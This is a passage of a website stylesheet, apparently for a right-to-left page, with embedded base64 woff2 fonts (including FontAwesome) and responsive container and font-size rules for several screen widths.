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)format("woff2")
            }

            html,body {
                direction: rtl;
                text-rendering: optimizeLegibility
            }

            img {
                max-width: 100%
            }

            .flexi_wrapper {
                max-width: 100%;
                overflow: hidden
            }

            .container {
                width: 92%;
                margin-left: auto;
                margin-right: auto;
                position: relative;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                -ms-box-sizing: border-box;
                box-sizing: border-box
            }

            .rtl {
                direction: rtl
            }

            .center {
                text-align: center
            }

            .margin {
                margin: 1em
            }

            @media only screen and (max-width: 767px) {
                html,body {
                    font-size:12pt
                }

                .sp_hide {
                    display: none!important
                }
            }

            @media only screen and (max-width: 479px) {
                .container {
                    width:100%
                }
            }

            @media only screen and (min-width: 480px) and (max-width:767px) {
                .container {
                    width:100%
                }
            }

            @media only screen and (min-width: 768px) and (max-width:1199px) {
            }

            @media only screen and (min-width: 768px) and (max-width:979px) {
                html,body {
                    font-size:12pt
                }

                .container {
                    width: 100%;
                    max-width: 931px
                }
            }

            @media only screen and (min-width: 980px) and (max-width:1199px) {
                html,body {
                    font-size:12pt
                }

                .container {
                    width: 95%
                }
            }

            @media only screen and (min-width: 1200px) and (max-width:1399px) {
                html,body {
                    font-size:12pt
                }
            }

            @media only screen and (min-width: 1200px) and (max-width:1599px) {
                html,body {
                    font-size:12pt
                }

                .container {
                    width: 95%;
                    min-width: 1140px;
                    max-width: 1200px
                }
            }

            @media only screen and (min-width: 1600px) {
                html,body {
                    font-size:12pt
                }

                .container {
                    width: 95%;
                    max-width: 1700px
                }
            }

            @font-face {
                font-family: "FontAwesome";
                src: url(data:font/woff2;base64,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